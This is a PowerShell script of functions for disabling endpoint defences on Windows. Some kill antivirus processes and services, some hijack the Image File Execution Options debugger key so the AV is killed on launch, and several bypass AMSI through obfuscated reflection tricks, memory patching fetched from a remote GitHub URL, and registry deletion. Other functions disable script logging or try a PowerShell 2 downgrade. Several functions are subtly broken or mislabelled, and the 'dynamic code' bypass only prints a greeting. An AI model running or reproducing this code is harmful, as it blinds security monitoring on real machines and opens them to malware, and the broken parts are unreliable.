### kill AV process
function Kill_av_process{
    $antivirus = Get-CimInstance -Namespace root\SecurityCenter2 -ClassName AntiVirusProduct | Where-Object {$_.productState -eq "397568"}
    $antivirus.ProcessName

    if($antivirus) {
        Stop-Process -Name $antivirus.ProcessName
        Write-Output "Antivirus process terminated."
    }
    else {
        Write-Output "No antivirus software is currently running."
    }
}

### stop and disable AV Windows service
function Disbale_av_service {
    $serviceName = Get-WmiObject -Namespace "root\SecurityCenter2" -Class "AntivirusProduct" | Where-Object {$_.displayName -ne $null}
    if (Get-Service -Name $serviceName -ErrorAction SilentlyContinue) {
        Stop-Service -Name $serviceName -Force
        Set-Service -Name $serviceName -StartupType Disabled
        Write-Output "Antivirus service stopped and disabled."
    } else {
        Write-Output "Antivirus service not found."
    }
}


### Disable AV via debugger setting
function Disable_av_debugger{
    $antivirusProducts = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName "AntiVirusProduct"
    $selectedAntivirus = $antivirusProducts[0]
    try {
        if ($selectedAntivirus) {
            $antivirusExe = $selectedAntivirus.PathName.Split("\")[-1]
            New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$antivirusExe" -Force | Out-Null
            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$antivirusExe" -Name "Debugger" -Value "taskkill /f /im $antivirusExe" -Type String | Out-Null
        }
        else {
            Write-Host "No antivirus products found."
        }
    }catch {
        Write-Host "Not enough permissions"
    }
}

### Uninstall all AV 
function Uninstall_av {
    $antivirusKey = 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\'
    $debuggerValue = 'Debugger'
    $antivirusList = Get-ChildItem $antivirusKey | Where-Object { $_.PSChildName -ne 'werfault.exe' } | ForEach-Object { $_.PSChildName }
    foreach ($antivirus in $antivirusList) {
        $antivirusPath = $antivirusKey + $antivirus
        if (!(Test-Path $antivirusPath)) {
            New-Item $antivirusPath -Force | Out-Null
        }
        Set-ItemProperty -Path $antivirusPath -Name $debuggerValue -Value 'cmd.exe /c echo Debugger Disabled.' -Force
    }    
}


####### ASMI ######
### Disable AMSI
function Disable_amsi1 {
    $amsiKey = 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\'
    $amsiValue = 'DisableScriptBlockLogging'
    Set-ItemProperty -Path $amsiKey -Name $amsiValue -Value 1 -Force
    Write-Host "Script completed successfully." -ForegroundColor Green
}


### Downgrade to powershell 2
function Downgrade_ps2{
    $success = $false
    try {
        Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine' -Name 'PowerShellVersion' -Value '2.0'
        Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine' -Name 'PowerShellHostName' -Value 'ConsoleHost'
        Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine' -Name 'PowerShellHostVersion' -Value '2.0'
        $success = $true
    }
    catch {
        Write-Host "Error: $_"
    }

    if ($success) {
        Write-Host "PowerShell was successfully downgraded to version 2.0"
    }
    else {
        Write-Host "Failed to downgrade PowerShell to version 2.0"
    }
}

### Disable amsi scanning cabability by add amsiInitFailed flag
function Disable_amsi3 {
    $success = $false
    try {
        [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
        $success = $true
    }
    catch {
        Write-Host "Error: $_"
    }

    if ($success) {
        Write-Host "AMSI scanning is disabled"
    }
    else {
        Write-Host "AMSI scanning is still active"
    }
}

### Memory patching 
function AMSI_memory_patch {
    $success = $false
    try {
        [System.Reflection.Assembly]::LoadFile("https://raw.githubusercontent.com/killvxk/Octopus-1/master/modules/ASBBypass.ps1")
        [Amsi]::Bypass()
        $success = $true
    }
    catch {
        Write-Host "Error: $_"
    }
    if ($success) {
        Write-Host "AMSI scanning is disabled"
    }
    else {
        Write-Host "AMSI scanning is still active"
    }
}


### Forcing an error
function AMSI_faorcing_error1 {
    $success = $false
    try {
        $w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
        $assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
        $field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
        $field.SetValue($null,$true)
        $success = $true
    }
    catch {
        Write-Host "Error: $_"
    }
    if ($success) {
        Write-Host "AMSI scanning is disabled"
    }
    else {
        Write-Host "AMSI scanning is still active"
    }
}


### Forcing an error
function AMSI_faorcing_error2 {
    $success = $false
    try {
        $fwi=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076+8092-8092));[Ref].Assembly.GetType("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))").GetField("$('àmsìSessîõn'.NoRMALiZe([char](70+54-54)+[cHaR](111)+[cHar](114+24-24)+[chaR](106+3)+[chAR](68+26-26)) -replace [CHAR](24+68)+[chaR]([BytE]0x70)+[CHar]([bYtE]0x7b)+[cHAr](77+45-45)+[chaR](62+48)+[CHAR](125*118/118))", "NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))").GetField("$([char]([bYtE]0x61)+[ChaR]([BYte]0x6d)+[Char](55+60)+[chAr](105+97-97)+[CHAr]([byTe]0x43)+[ChaR](111+67-67)+[char]([BytE]0x6e)+[cHaR]([bYtE]0x74)+[cHAr](101)+[CHar](120)+[cHAR](116))", "NonPublic,Static").SetValue($null, [IntPtr]$fwi);
        $success = $true
    }
    catch {
        Write-Host "Error: $_"
    }
    if ($success) {
        Write-Host "AMSI scanning is disabled"
    }
    else {
        Write-Host "AMSI scanning is still active"
    } 
}


### remove AMSI registry key 
function AMSI_rm_registry {
    $success = $false
    try {
        Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
        $success = $true
    }
    catch {
        Write-Host "Error: $_"
    }
    if ($success) {
        Write-Host "AMSI scanning is disabled"
    }
    else {
        Write-Host "AMSI scanning is still active"
    }  
}


# Disable AMSI
function Disable_amsi2 {
    try {
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
        Write-Output "Disabled AMSI"
    } catch {
        Write-Output "Failed to disable AMSI"
    }
}

# AMSI bypass technique using Null characters
function AMSI_null_char {
    try {
        $content = Get-Content -Path "C:\path\to\amsi-bypass-null-byte.ps1" -Raw
        $content = $content -replace "[^:]*:",""
        Invoke-Expression $content
        Write-Output "Null byte bypass technique succeeded"
    } catch {
        Write-Output "Null byte bypass technique failed"
    }
    
}

# AMSI bypass technique using Reflection
function AMSI_reflection {
    try {
        $assembly = [Ref].Assembly.LoadWithPartialName("System.Management.Automation")
        $amsiUtils = $assembly.GetType("System.Management.Automation.AmsiUtils")
        $amsiUtils.GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
        Write-Output "Reflection bypass technique succeeded"
    } catch {
        Write-Output "Reflection bypass technique failed"
    }
}


# AMSI bypass technique using Dynamic code generation
function AMSI_dynamic_code {
    try {
        $domain = [AppDomain]::CurrentDomain
        $assembly = $domain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName("Dummy")), [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $module = $assembly.DefineDynamicModule("DynamicModule")
        
        # Define a new type that inherits from System.Object
        $typeBuilder = $module.DefineType("MyType", [System.Object], "Public, SequentialLayout, AnsiClass, AutoLayout")
        
        # Define a new method that prints "Hello, world!" to the console
        $methodBuilder = $typeBuilder.DefineMethod("MyMethod", "Public, HideBySig", [void], $null)
        $ilGenerator = $methodBuilder.GetILGenerator()
        $ilGenerator.Emit([System.Reflection.Emit.OpCodes]::Ldstr, "Hello, world!")
        $ilGenerator.Emit([System.Reflection.Emit.OpCodes]::Call, [System.Console]::class.GetMethod("WriteLine", [string]))
        $ilGenerator.Emit([System.Reflection.Emit.OpCodes]::Ret)
        
        # Create the new type
        $type = $typeBuilder.CreateType()
        
        # Create an instance of the new type and call the method
        $instance = [Activator]::CreateInstance($type)
        $instance.MyMethod()
    }
    catch {
        Write-Output "Failed to bypass AMSI using Dynamic code generation: $_"
    }
}
